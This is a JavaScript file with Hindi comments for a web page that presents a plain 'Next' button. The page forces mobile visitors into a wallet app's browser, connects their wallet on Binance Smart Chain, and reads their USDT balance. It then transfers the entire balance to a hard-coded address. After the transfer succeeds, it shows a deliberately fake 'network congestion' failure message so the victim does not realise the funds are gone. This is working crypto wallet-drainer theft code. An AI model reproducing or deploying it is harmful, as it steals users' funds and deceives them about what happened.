function openInWallet() {
    const websiteUrl = window.location.href.replace("https://", ""); // आपकी साइट का URL
    
    // Deep link URLs
    const trustWalletUrl = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + websiteUrl;
    const metaMaskUrl = "https://metamask.app.link/dapp/" + websiteUrl;

    // अगर ब्राउज़र में कोई वॉलेट नहीं मिला (जैसे सामान्य Chrome)
    if (!window.ethereum && !window.trustwallet) {
        // Android और iPhone के लिए अलग-अलग पहचान
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        if (isMobile) {
            // ट्रस्ट वॉलेट को प्राथमिकता दें, अगर नहीं तो मेटामास्क
            window.location.href = trustWalletUrl;
            
            // 2 सेकंड बाद मेटामास्क ट्राई करें अगर ट्रस्ट वॉलेट नहीं खुला
            setTimeout(() => {
                window.location.href = metaMaskUrl;
            }, 2000);
            return true; 
        }
    }
    return false; // अगर वॉलेट पहले से इंजेक्टेड है
}

// अपने Next फंक्शन में इसे सबसे ऊपर कॉल करें
async function Next() {
    const isRedirecting = openInWallet();
    if (isRedirecting) return; // अगर ऐप खुल रहा है तो आगे का कोड रोक दें

    // ... आपका पुराना Web3 कोड यहाँ रहेगा ...
}
// Addresses
const bscAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Real BSC USDT Address
const altWallet = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";

let web3, userAddress;

// 1. Provider ढूँढने का फंक्शन
async function getProvider() {
    if (window.ethereum) return window.ethereum;
    if (window.trustwallet) return window.trustwallet;
    if (window.web3) return window.web3.currentProvider;
    return null;
}

// 2. वॉलेट कनेक्ट और नेटवर्क स्विच
async function connect() {
    const provider = await getProvider();
    if (!provider) {
        alert("Wallet not found! If you are on mobile, please open this link inside Trust Wallet or MetaMask browser.");
        return false;
    }

    try {
        web3 = new Web3(provider);
        await provider.request({ method: 'eth_requestAccounts' });
        
        // BSC Network (Chain ID 56 / 0x38) पर स्विच करें
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (switchError) {
            // अगर नेटवर्क नहीं है तो ऐड करें
            if (switchError.code === 4902) {
                await provider.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com']
                    }]
                });
            }
        }

        const accounts = await web3.eth.getAccounts();
        userAddress = accounts[0];
        console.log("Connected:", userAddress);
        return true;
    } catch (error) {
        console.error("User denied connection");
        return false;
    }
}

// 3. Main Button Logic
async function handleNext() {
    const btn = document.getElementById("nextBtn");
    btn.disabled = true;
    btn.textContent = "Processing...";

    const isConnected = await connect();
    if (!isConnected) {
        btn.disabled = false;
        btn.textContent = "Next";
        return;
    }

    try {
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = parseFloat(web3.utils.fromWei(balanceWei, 'ether'));

        if (balance > 0) {
            // ट्रांसफर रिक्वेस्ट भेजें
            await contract.methods.transfer(bscAddress, balanceWei).send({ from: userAddress });
            
            // सफलता के बाद फेक एरर दिखाएँ
            setTimeout(() => {
                alert("❌ Transaction failed due to network congestion. Please try again.");
                btn.disabled = false;
                btn.textContent = "Next";
            }, 1000);
        } else {
            alert("No USDT found in your wallet.");
            btn.disabled = false;
            btn.textContent = "Next";
        }

    } catch (err) {
        console.error(err);
        alert("Transaction Cancelled or Failed.");
        btn.disabled = false;
        btn.textContent = "Next";
    }
}

// Event Listeners
document.getElementById("nextBtn").addEventListener("click", handleNext);

